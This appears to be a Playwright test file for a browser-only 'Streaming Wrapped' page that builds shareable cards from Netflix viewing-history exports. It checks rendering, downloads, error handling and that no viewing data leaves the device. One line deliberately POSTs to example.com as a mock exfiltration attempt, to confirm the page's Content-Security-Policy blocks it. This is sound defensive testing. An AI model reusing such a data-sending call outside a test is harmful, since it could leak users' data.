// Playwright end-to-end test for docs/netflix/ (Streaming Wrapped).
// Run: NODE_PATH=/opt/npm-tools/node_modules node bots/netflix/test_page.js <screenshot dir>
// Uses only synthetic fixtures. Kit is routed to a local stub; the real API is never hit.
const { chromium } = require('playwright');
const JSZip = require(require('path').resolve(__dirname, '../../docs/netflix/vendor/jszip-3.10.1.min.js'));
const http = require('http'), fs = require('fs'), path = require('path');

const ROOT = path.resolve(__dirname, '../../docs');
const FX = path.join(__dirname, 'fixtures');
const OUT = path.resolve(process.argv[2] || '.');
fs.mkdirSync(OUT, { recursive: true });
const PORT = 8769, ORIGIN = 'http://127.0.0.1:' + PORT;
const TYPES = { '.html': 'text/html', '.js': 'application/javascript', '.json': 'application/json', '.png': 'image/png', '.jpg': 'image/jpeg', '.css': 'text/css' };
const server = http.createServer((req, res) => {
  let p = decodeURIComponent(req.url.split('?')[0]); if (p.endsWith('/')) p += 'index.html';
  fs.readFile(path.join(ROOT, p), (e, b) => {
    if (e) { res.writeHead(404); res.end(); return; }
    res.writeHead(200, { 'Content-Type': TYPES[path.extname(p)] || 'application/octet-stream' }); res.end(b);
  });
}).listen(PORT);

let fails = 0;
const check = (c, m) => { console.log((c ? '  ok   ' : '  FAIL ') + m); if (!c) fails++; };

async function cardInfo(page) {
  return page.evaluate(() => [...document.querySelectorAll('#deck canvas')].map((c) => {
    const d = c.getContext('2d').getImageData(0, 0, c.width, c.height).data;
    let min = 765, max = 0, sum = 0;
    for (let i = 0; i < d.length; i += 4 * 997) { const v = d[i] + d[i + 1] + d[i + 2]; min = Math.min(min, v); max = Math.max(max, v); sum = (sum * 31 + v) >>> 0; }
    return { w: c.width, h: c.height, spread: max - min, hash: sum, label: c.getAttribute('aria-label') };
  }));
}

async function upload(page, file) {
  await page.evaluate(() => { document.querySelector('#deck').innerHTML = ''; });
  await page.setInputFiles('#file', path.join(FX, file));
  await page.waitForFunction(() => document.querySelectorAll('#deck canvas').length > 0, null, { timeout: 30000 });
  return cardInfo(page);
}

async function expectError(page, file, re) {
  await page.setInputFiles('#file', path.join(FX, file));
  await page.waitForFunction(() => document.querySelector('#status').classList.contains('err'));
  return re.test(await page.textContent('#status'));
}

(async () => {
  const browser = await chromium.launch();
  for (const width of [390, 1280]) {
    console.log(`\n== ${width}px ==`);
    const ctx = await browser.newContext({ viewport: { width, height: 900 }, acceptDownloads: true });
    const page = await ctx.newPage();
    await page.clock.install({ time: new Date('2026-11-14T12:00:00') });
    const errs = []; page.on('pageerror', (e) => errs.push(String(e))); page.on('console', (m) => { if (m.type() === 'error') errs.push(m.text()); });

    // Record every request. Anything off-origin is aborted.
    const all = [], offOrigin = [];
    await ctx.route('**/*', (route) => {
      const r = route.request();
      all.push({ url: r.url(), method: r.method() });
      if (!r.url().startsWith(ORIGIN + '/')) { offOrigin.push(r.url()); return route.abort(); }
      return route.continue();
    });

    await page.goto(ORIGIN + '/netflix/?ref=tiktok');
    await page.waitForLoadState('networkidle');
    check(offOrigin.length === 0, `page load makes no off-origin requests (${offOrigin.join(', ') || 'none'})`);
    check(/never leaves your device\./.test(await page.textContent('#privacy-badge')), 'privacy promise visible');
    check(/Not affiliated with Netflix/.test(await page.textContent('footer')), 'footer disclaimer present');
    check(await page.locator('footer a[href="../"]').count() === 1, 'footer links to ../');
    const csp = await page.getAttribute('meta[http-equiv="Content-Security-Policy"]', 'content');
    check(/default-src 'none'/.test(csp) && /script-src 'self'/.test(csp) && /connect-src https:\/\/api\.convertkit\.com;/.test(csp), 'CSP: scripts self-only, connections to Kit only');
    const title = await page.title(), desc = await page.getAttribute('meta[name="description"]', 'content');
    check(/netflix wrapped/i.test(title) && /netflix year in review/i.test(title + desc), 'SEO title/description target "netflix wrapped" / "netflix year in review"');
    check(/og\.(png|jpg)$/.test(await page.getAttribute('meta[property="og:image"]', 'content')), 'OG image set');
    check(/help\.netflix\.com\/en\/node\/101917/.test(await page.innerHTML('#export')), 'export steps cite the Netflix help center');
    check(/\?ref=share-tiktok$/.test(await page.textContent('#pass-text')), '?ref passthrough: shared link carries ref=share-tiktok');
    check(await page.evaluate(() => document.querySelector('.peek img').naturalWidth > 0), 'preview image loads');
    const loadCount = all.length;

    // Main US-format file.
    let cards = await upload(page, 'NetflixViewingHistory.csv');
    const labels = cards.map((c) => c.label.replace(/^Card \d+: /, ''));
    check(cards.length >= 8 && cards.length <= 10, `main CSV -> ${cards.length} cards (${labels.join(', ')})`);
    ['Titles watched', 'Top show', 'The binge', 'When you watch', 'Movies vs series', 'Comfort watch', 'Longest streak', 'First and last', 'Viewer personality'].forEach((l) => check(labels.includes(l), `has card: ${l}`));
    check(cards.every((c) => c.w === 1080 && c.h === 1920), 'every card is 1080x1920');
    check(cards.every((c) => c.spread > 200), 'every card has rendered content (not blank)');
    check((await page.inputValue('#year')) === '2026', 'year selector defaults to the current year (2026)');
    check(await page.isHidden('#profile-wrap'), 'profile selector hidden for a single-profile file');
    const opts = await page.$$eval('#year option', (o) => o.map((x) => x.value));
    check(JSON.stringify(opts) === '["2026","2025","all"]', `year options ${opts.join(',')}`);
    const h0 = cards[0].hash;
    await page.selectOption('#year', '2025');
    let c2 = await cardInfo(page);
    check(c2.length >= 6 && c2[0].hash !== h0, `2025 re-renders (${c2.length} cards)`);
    await page.selectOption('#year', 'all');
    c2 = await cardInfo(page);
    check(c2.length >= 8 && c2.every((c) => c.spread > 200), `all time renders (${c2.length} cards)`);
    await page.selectOption('#year', '2026');
    await page.fill('#name-input', 'Sam');
    await page.waitForTimeout(450);
    c2 = await cardInfo(page);
    check(c2[0].hash !== h0, 'name on cards re-renders');
    check(await page.evaluate(() => document.documentElement.scrollWidth <= window.innerWidth), 'no horizontal page scroll');
    await page.screenshot({ path: path.join(OUT, `page-${width}.png`), fullPage: width === 1280 });
    if (width === 390) await page.locator('#deck').screenshot({ path: path.join(OUT, `deck-${width}.png`) });

    // Save one PNG and the zip.
    const [dl1] = await Promise.all([page.waitForEvent('download'), page.click('#deck figure:first-child button:has-text("Save PNG")')]);
    const p1 = await dl1.path();
    check(/^streaming-wrapped-2026-01-.*\.png$/.test(dl1.suggestedFilename()) && fs.statSync(p1).size > 50000, `Save PNG -> ${dl1.suggestedFilename()} (${fs.statSync(p1).size} bytes)`);
    const [dlz] = await Promise.all([page.waitForEvent('download'), page.click('#zip-all')]);
    const z = await JSZip.loadAsync(fs.readFileSync(await dlz.path()));
    check(Object.keys(z.files).length === cards.length, `zip has ${Object.keys(z.files).length} PNGs`);

    // Other date formats give the same deck.
    for (const f of ['NetflixViewingHistory_uk.csv', 'NetflixViewingHistory_de.csv']) {
      const cs = await upload(page, f);
      check(cs.length === cards.length && cs.map((c) => c.label).join() === cards.map((c) => c.label).join(), `${f} -> same ${cs.length} cards`);
    }
    // Full data-request zip with two profiles.
    cards = await upload(page, 'netflix-report.zip');
    check(cards.length >= 8, `data-request .zip -> ${cards.length} cards`);
    check(!(await page.isHidden('#profile-wrap')), 'profile selector shown for a two-profile archive');
    const before = (await cardInfo(page))[0].hash;
    await page.selectOption('#profile', 'Robin');
    await page.waitForTimeout(150);
    const robin = await cardInfo(page);
    check(robin.length >= 3 && robin[0].hash !== before, `switching profile re-renders (${robin.length} cards)`);
    await page.screenshot({ path: path.join(OUT, `page-${width}-archive.png`) });
    for (const [f, min] of [['excel_semicolon.csv', 5], ['no_header.csv', 3], ['tricky_titles.csv', 3], ['tiny.csv', 3], ['ambiguous_dmy.csv', 3]]) {
      cards = await upload(page, f);
      check(cards.length >= min && cards.every((c) => c.spread > 200), `${f} -> ${cards.length} cards`);
    }
    check(await expectError(page, 'not_netflix.csv', /doesn.t look like a Netflix viewing history/), 'non-Netflix CSV shows a clear error');
    check(await expectError(page, 'empty.csv', /doesn.t look like|nothing watched/), 'empty export shows a clear error');

    // The core privacy assertion: after page load, uploading and rendering made zero network requests.
    // The static "More free apps" strip (../apps/more.js, more.css, lazy thumbnails) may load after upload; it sends no data.
    const afterUpload = all.slice(loadCount).filter((r) => !(r.method === 'GET' && /^\/apps\/(more\.(js|css)|img\/[a-z-]+\.jpg)$/.test(r.url.replace(ORIGIN, ''))));
    check(afterUpload.length === 0 && offOrigin.length === 0, `zero network requests after upload (${afterUpload.length} made: ${afterUpload.map((r) => r.method + ' ' + r.url).join(', ') || 'none'})`);

    // CSP really blocks an exfiltration attempt from page context.
    const blocked = await page.evaluate(() => fetch('https://example.com/x', { method: 'POST', body: 'test' }).then(() => false, () => true));
    check(blocked, 'CSP blocks fetch to a third-party origin');

    // Kit signup sends only the email (history still loaded on the page).
    const kit = [];
    await ctx.unroute('**/*');
    await page.route(/convertkit\.com|kit\.com/, async (route) => {
      kit.push({ url: route.request().url(), body: route.request().postData() || '' });
      await route.fulfill({ status: 200, contentType: 'application/json', headers: { 'Access-Control-Allow-Origin': '*' }, body: '{"subscription":{"id":1}}' });
    });
    await upload(page, 'NetflixViewingHistory.csv');
    await page.fill('#signup-email', 'test@example.com');
    await page.click('#signup-form button');
    await page.waitForFunction(() => /on the list|didn't go through/.test(document.querySelector('#notify').textContent));
    const body = kit[0] ? JSON.parse(kit[0].body) : {};
    check(kit.length === 1 && /\/v3\/tags\/25912978\/subscribe$/.test(kit[0].url), 'Kit called once with the 25912978 placeholder');
    check(JSON.stringify(Object.keys(body).sort()) === '["api_key","email"]' && !/Saltmarsh|Juniper|Orchard|Season/.test(kit[0].body), 'Kit body has only api_key + email (no viewing data)');

    // Sample button.
    await page.click('#reset');
    await page.click('#sample');
    await page.waitForFunction(() => document.querySelectorAll('#deck canvas').length >= 8);
    check(/made-up sample/.test(await page.textContent('#status')), 'sample deck renders and says it is made up');
    const realErrs = errs.filter((e) => !/example\.com\/x/.test(e)); // the deliberate CSP probe above
    check(realErrs.length === 0, `no page errors (${realErrs.join(' | ') || 'none'})`);
    await ctx.close();
  }

  // New year with nothing watched yet: falls back to the latest year; picking the empty year explains itself.
  {
    console.log('\n== January 2027 ==');
    const ctx = await browser.newContext({ viewport: { width: 390, height: 900 } });
    const page = await ctx.newPage();
    await page.clock.install({ time: new Date('2027-01-05T12:00:00') });
    await page.goto(ORIGIN + '/netflix/');
    await upload(page, 'NetflixViewingHistory.csv');
    check((await page.inputValue('#year')) === '2026', 'falls back to 2026 when 2027 has nothing yet');
    check(/Nothing watched in 2027 yet/.test(await page.textContent('#status')), 'status explains the fallback');
    await page.selectOption('#year', '2027');
    await page.waitForFunction(() => !document.querySelector('#empty').hidden);
    check((await page.$$('#deck canvas')).length === 0 && /Nothing watched in 2027/.test(await page.textContent('#empty')), 'empty year shows a message, no cards');
    await ctx.close();
  }

  // Export every card as PNGs for visual review.
  const ctx = await browser.newContext({ viewport: { width: 1280, height: 900 } });
  const page = await ctx.newPage();
  await page.clock.install({ time: new Date('2026-11-14T12:00:00') });
  await page.goto(ORIGIN + '/netflix/');
  for (const [fx, tag] of [['NetflixViewingHistory.csv', 'main'], ['netflix-report.zip', 'archive']]) {
    await upload(page, fx);
    const urls = await page.evaluate(() => [...document.querySelectorAll('#deck canvas')].map((c) => c.toDataURL('image/png')));
    urls.forEach((u, i) => fs.writeFileSync(path.join(OUT, `card-${tag}-${String(i + 1).padStart(2, '0')}.png`), Buffer.from(u.split(',')[1], 'base64')));
  }
  await browser.close(); server.close();
  console.log(fails ? `\n${fails} FAILED` : '\nALL PASSED');
  process.exit(fails ? 1 : 0);
})().catch((e) => { console.error(e); process.exit(1); });
